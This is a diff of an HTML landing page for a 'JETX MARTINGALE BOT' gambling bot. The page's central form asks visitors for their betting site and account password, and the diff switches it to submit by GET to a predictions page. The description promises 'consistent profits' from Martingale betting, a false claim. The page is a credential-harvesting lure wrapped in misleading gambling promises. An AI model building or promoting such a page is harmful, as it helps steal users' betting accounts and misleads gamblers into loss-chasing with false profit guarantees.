@@ -13,15 +13,23 @@
             background-image: url('https://source.unsplash.com/1600x900/?gambling,casino');
             background-size: cover;
             background-position: center;
-            padding: 50px;
+            padding: 0;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
         }
+
         h1 {
             font-size: 3em;
             background: linear-gradient(to right, #ff3366, #ff6699);
             color: transparent;
             -webkit-background-clip: text;
             animation: fadeColor 3s infinite alternate;
+            margin-top: 50px;
         }
+
         @keyframes fadeColor {
             0% {
                 background: linear-gradient(to right, #ff3366, #ff6699);
@@ -30,39 +38,23 @@
                 background: linear-gradient(to right, #ff6699, #ff3366);
             }
         }
-        .description {
-            margin: 20px auto;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 15px;
-            padding: 20px;
-            max-width: 800px;
-            font-size: 1.2em;
-            text-align: left;
-        }
-        .cta-button {
-            background-color: #ff3366;
-            color: white;
-            padding: 20px 50px;
-            font-size: 1.5em;
-            border-radius: 5px;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-            transition: background-color 0.3s;
-            margin-top: 30px;
-        }
-        .cta-button:hover {
-            background-color: #ff6699;
-        }
+
         .form-container {
-            margin-top: 50px;
             background: rgba(0, 0, 0, 0.7);
             padding: 30px;
             border-radius: 10px;
             display: inline-block;
             text-align: left;
             max-width: 400px;
+            margin-top: 50px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.7);
         }
+
+        .form-container h2 {
+            font-size: 1.5em;
+            margin-bottom: 20px;
+        }
+
         .form-container input {
             width: 100%;
             padding: 12px;
@@ -71,6 +63,7 @@
             border-radius: 5px;
             font-size: 16px;
         }
+
         .form-container button {
             width: 100%;
             background-color: #ff3366;
@@ -82,33 +75,58 @@
             cursor: pointer;
             transition: background-color 0.3s;
         }
+
         .form-container button:hover {
             background-color: #ff6699;
         }
+
+        .description {
+            margin: 50px auto;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 20px;
+            max-width: 800px;
+            font-size: 1.2em;
+            text-align: left;
+        }
+
+        .contact-info {
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 20px;
+            font-size: 1.2em;
+        }
+
     </style>
 </head>
 <body>
 
     <h1>🔥 JETX MARTINGALE BOT 🔥</h1>
 
-    <div class="description">
-        <p>The <strong>JETX MARTINGALE BOT</strong> is designed for players who want to maximize their winnings using the Martingale betting system. This bot adapts to the game's flow, helping you make calculated bets to recover losses and achieve consistent profits.</p>
-        <p>Take control of your game with our bot and start winning today!</p>
-    </div>
-
-    <a href="betting_site_and_password_page.html" class="cta-button">Get Started Now!</a>
-
+    <!-- Betting Site & Password Form -->
     <div class="form-container">
         <h2>Enter Your Betting Site and Password</h2>
-        <form action="submit_betting_info.php" method="post">
+        <form action="predictions_page.html" method="get">
             <label for="site">Betting Site:</label>
             <input type="text" id="site" name="site" placeholder="Enter Betting Site URL" required>
 
             <label for="password">Password:</label>
             <input type="password" id="password" name="password" placeholder="Enter Your Password" required>
 
-            <button type="submit">Submit Information</button>
+            <button type="submit">Proceed to Predictions</button>
         </form>
+    </div>
+
+    <!-- Description Section -->
+    <div class="description">
+        <p>The <strong>JETX MARTINGALE BOT</strong> is designed for players who want to maximize their winnings using the Martingale betting system. This bot adapts to the game's flow, helping you make calculated bets to recover losses and achieve consistent profits.</p>
+        <p>Take control of your game with our bot and start winning today!</p>
+    </div>
+
+    <!-- Contact Info Section -->
+    <div class="contact-info">
+        <p>For more information, contact <strong>B.Jay</strong> at <a href="mailto:bjay@example.com" style="color: #ff3366;">bjay@example.com</a>.</p>
     </div>
 
 </body>
